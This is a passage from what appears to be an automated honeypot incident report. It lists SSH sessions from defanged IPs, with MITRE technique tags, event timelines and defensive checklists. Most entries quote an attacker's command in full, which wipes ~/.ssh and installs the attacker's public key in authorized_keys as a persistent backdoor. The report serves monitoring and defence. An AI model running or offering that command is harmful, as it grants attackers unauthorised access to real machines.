| `2026-05-01 22:06:13` | `cowrie.login.success` |
| `2026-05-01 22:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab51ca240510

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]78` |
| **First Seen** | 2026-05-01 22:07 |
| **Last Seen** | 2026-05-01 22:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:07:17` | `cowrie.session.connect` |
| `2026-05-01 22:07:17` | `cowrie.client.version` |
| `2026-05-01 22:07:17` | `cowrie.client.kex` |
| `2026-05-01 22:07:19` | `cowrie.login.success` |
| `2026-05-01 22:07:19` | `cowrie.session.params` |
| `2026-05-01 22:07:19` | `cowrie.command.input` |
| `2026-05-01 22:07:19` | `cowrie.command.failed` |
| `2026-05-01 22:07:20` | `cowrie.log.closed` |
| `2026-05-01 22:07:20` | `cowrie.session.params` |
| `2026-05-01 22:07:20` | `cowrie.command.input` |
| `2026-05-01 22:07:21` | `cowrie.session.file_download` |
| `2026-05-01 22:07:21` | `cowrie.log.closed` |
| `2026-05-01 22:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]78` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5927ac93571d

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:07 |
| **Last Seen** | 2026-05-01 22:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:07:24` | `cowrie.session.connect` |
| `2026-05-01 22:07:24` | `cowrie.client.version` |
| `2026-05-01 22:07:24` | `cowrie.client.kex` |
| `2026-05-01 22:07:25` | `cowrie.login.success` |
| `2026-05-01 22:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-300f7513d915

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]125` |
| **First Seen** | 2026-05-01 22:08 |
| **Last Seen** | 2026-05-01 22:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:08:28` | `cowrie.session.connect` |
| `2026-05-01 22:08:28` | `cowrie.client.version` |
| `2026-05-01 22:08:28` | `cowrie.client.kex` |
| `2026-05-01 22:08:29` | `cowrie.login.success` |
| `2026-05-01 22:08:30` | `cowrie.session.params` |
| `2026-05-01 22:08:30` | `cowrie.command.input` |
| `2026-05-01 22:08:30` | `cowrie.command.failed` |
| `2026-05-01 22:08:30` | `cowrie.log.closed` |
| `2026-05-01 22:08:31` | `cowrie.session.params` |
| `2026-05-01 22:08:31` | `cowrie.command.input` |
| `2026-05-01 22:08:31` | `cowrie.session.file_download` |
| `2026-05-01 22:08:31` | `cowrie.log.closed` |
| `2026-05-01 22:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]125` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96760d88544

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:08 |
| **Last Seen** | 2026-05-01 22:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:08:35` | `cowrie.session.connect` |
| `2026-05-01 22:08:35` | `cowrie.client.version` |
| `2026-05-01 22:08:35` | `cowrie.client.kex` |
| `2026-05-01 22:08:36` | `cowrie.login.success` |
| `2026-05-01 22:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36876e57444

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]7` |
| **First Seen** | 2026-05-01 22:09 |
| **Last Seen** | 2026-05-01 22:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:09:38` | `cowrie.session.connect` |
| `2026-05-01 22:09:38` | `cowrie.client.version` |
| `2026-05-01 22:09:38` | `cowrie.client.kex` |
| `2026-05-01 22:09:39` | `cowrie.login.success` |
| `2026-05-01 22:09:40` | `cowrie.session.params` |
| `2026-05-01 22:09:40` | `cowrie.command.input` |
| `2026-05-01 22:09:40` | `cowrie.command.failed` |
| `2026-05-01 22:09:40` | `cowrie.log.closed` |
| `2026-05-01 22:09:41` | `cowrie.session.params` |
| `2026-05-01 22:09:41` | `cowrie.command.input` |
| `2026-05-01 22:09:41` | `cowrie.session.file_download` |
| `2026-05-01 22:09:41` | `cowrie.log.closed` |
| `2026-05-01 22:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]7` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56887ceba85

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]104` |
| **First Seen** | 2026-05-01 22:09 |
| **Last Seen** | 2026-05-01 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:09:45` | `cowrie.session.connect` |
| `2026-05-01 22:09:45` | `cowrie.client.version` |
| `2026-05-01 22:09:45` | `cowrie.client.kex` |
| `2026-05-01 22:09:46` | `cowrie.login.success` |
| `2026-05-01 22:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]104` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb058394e586

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:11 |
| **Last Seen** | 2026-05-01 22:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:11:53` | `cowrie.session.connect` |
| `2026-05-01 22:11:53` | `cowrie.client.version` |
| `2026-05-01 22:11:54` | `cowrie.client.kex` |
| `2026-05-01 22:11:55` | `cowrie.login.success` |
| `2026-05-01 22:11:55` | `cowrie.session.params` |
| `2026-05-01 22:11:55` | `cowrie.command.input` |
| `2026-05-01 22:11:55` | `cowrie.command.failed` |
| `2026-05-01 22:11:56` | `cowrie.log.closed` |
| `2026-05-01 22:11:56` | `cowrie.session.params` |
| `2026-05-01 22:11:56` | `cowrie.command.input` |
| `2026-05-01 22:11:57` | `cowrie.session.file_download` |
| `2026-05-01 22:11:57` | `cowrie.log.closed` |
| `2026-05-01 22:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70f5a929dee1

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:12 |
| **Last Seen** | 2026-05-01 22:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:12:00` | `cowrie.session.connect` |
| `2026-05-01 22:12:00` | `cowrie.client.version` |
| `2026-05-01 22:12:00` | `cowrie.client.kex` |
| `2026-05-01 22:12:02` | `cowrie.login.success` |
| `2026-05-01 22:12:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a1314340b33

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]46` |
| **First Seen** | 2026-05-01 22:13 |
| **Last Seen** | 2026-05-01 22:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:13:01` | `cowrie.session.connect` |
| `2026-05-01 22:13:01` | `cowrie.client.version` |
| `2026-05-01 22:13:01` | `cowrie.client.kex` |
| `2026-05-01 22:13:02` | `cowrie.login.success` |
| `2026-05-01 22:13:03` | `cowrie.session.params` |
| `2026-05-01 22:13:03` | `cowrie.command.input` |
| `2026-05-01 22:13:03` | `cowrie.command.failed` |
| `2026-05-01 22:13:03` | `cowrie.log.closed` |
| `2026-05-01 22:13:04` | `cowrie.session.params` |
| `2026-05-01 22:13:04` | `cowrie.command.input` |
| `2026-05-01 22:13:04` | `cowrie.session.file_download` |
| `2026-05-01 22:13:04` | `cowrie.log.closed` |
| `2026-05-01 22:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]46` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99fb996ce9e0

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:13 |
| **Last Seen** | 2026-05-01 22:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:13:07` | `cowrie.session.connect` |
| `2026-05-01 22:13:07` | `cowrie.client.version` |
| `2026-05-01 22:13:07` | `cowrie.client.kex` |
| `2026-05-01 22:13:09` | `cowrie.login.success` |
| `2026-05-01 22:13:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0425f4795af

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]165` |
| **First Seen** | 2026-05-01 22:15 |
| **Last Seen** | 2026-05-01 22:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:15:20` | `cowrie.session.connect` |
| `2026-05-01 22:15:20` | `cowrie.client.version` |
| `2026-05-01 22:15:20` | `cowrie.client.kex` |
| `2026-05-01 22:15:21` | `cowrie.login.success` |
| `2026-05-01 22:15:22` | `cowrie.session.params` |
| `2026-05-01 22:15:22` | `cowrie.command.input` |
| `2026-05-01 22:15:22` | `cowrie.command.failed` |
| `2026-05-01 22:15:22` | `cowrie.log.closed` |
| `2026-05-01 22:15:23` | `cowrie.session.params` |
| `2026-05-01 22:15:23` | `cowrie.command.input` |
| `2026-05-01 22:15:23` | `cowrie.session.file_download` |
| `2026-05-01 22:15:23` | `cowrie.log.closed` |
| `2026-05-01 22:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]165` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aacdf0be4d56

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:15 |
| **Last Seen** | 2026-05-01 22:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:15:26` | `cowrie.session.connect` |
| `2026-05-01 22:15:26` | `cowrie.client.version` |
| `2026-05-01 22:15:27` | `cowrie.client.kex` |
| `2026-05-01 22:15:28` | `cowrie.login.success` |
| `2026-05-01 22:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f4d594fb96a

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:16 |
| **Last Seen** | 2026-05-01 22:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:16:28` | `cowrie.session.connect` |
| `2026-05-01 22:16:28` | `cowrie.client.version` |
| `2026-05-01 22:16:28` | `cowrie.client.kex` |
| `2026-05-01 22:16:29` | `cowrie.login.success` |
| `2026-05-01 22:16:30` | `cowrie.session.params` |
| `2026-05-01 22:16:30` | `cowrie.command.input` |
| `2026-05-01 22:16:30` | `cowrie.command.failed` |
| `2026-05-01 22:16:30` | `cowrie.log.closed` |
| `2026-05-01 22:16:31` | `cowrie.session.params` |
| `2026-05-01 22:16:31` | `cowrie.command.input` |
| `2026-05-01 22:16:31` | `cowrie.session.file_download` |
| `2026-05-01 22:16:31` | `cowrie.log.closed` |
| `2026-05-01 22:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72f091fe274

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:16 |
| **Last Seen** | 2026-05-01 22:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:16:34` | `cowrie.session.connect` |
| `2026-05-01 22:16:34` | `cowrie.client.version` |
| `2026-05-01 22:16:35` | `cowrie.client.kex` |
| `2026-05-01 22:16:36` | `cowrie.login.success` |
| `2026-05-01 22:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f719ffe9192c

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]104` |
| **First Seen** | 2026-05-01 22:17 |
| **Last Seen** | 2026-05-01 22:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:17:42` | `cowrie.session.connect` |
| `2026-05-01 22:17:42` | `cowrie.client.version` |
| `2026-05-01 22:17:42` | `cowrie.client.kex` |
| `2026-05-01 22:17:44` | `cowrie.login.success` |
| `2026-05-01 22:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]104` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d64e57f4355

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:19 |
| **Last Seen** | 2026-05-01 22:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 22:19:49` | `cowrie.session.connect` |
| `2026-05-01 22:19:49` | `cowrie.client.version` |
| `2026-05-01 22:19:49` | `cowrie.client.kex` |
| `2026-05-01 22:19:51` | `cowrie.login.success` |
| `2026-05-01 22:19:51` | `cowrie.session.params` |
| `2026-05-01 22:19:51` | `cowrie.command.input` |
| `2026-05-01 22:19:51` | `cowrie.command.failed` |
| `2026-05-01 22:19:51` | `cowrie.log.closed` |
| `2026-05-01 22:19:52` | `cowrie.session.params` |
| `2026-05-01 22:19:52` | `cowrie.command.input` |
| `2026-05-01 22:19:52` | `cowrie.session.file_download` |
| `2026-05-01 22:19:52` | `cowrie.log.closed` |
| `2026-05-01 22:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.255.75[.]12` to AbuseIPDB if not already reported
- [ ] Block `38.255.75[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a9329903953

| Field | Detail |
|---|---|
| **Source IP** | `38.255.75[.]12` |
| **First Seen** | 2026-05-01 22:22 |
| **Last Seen** | 2026-05-01 22:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
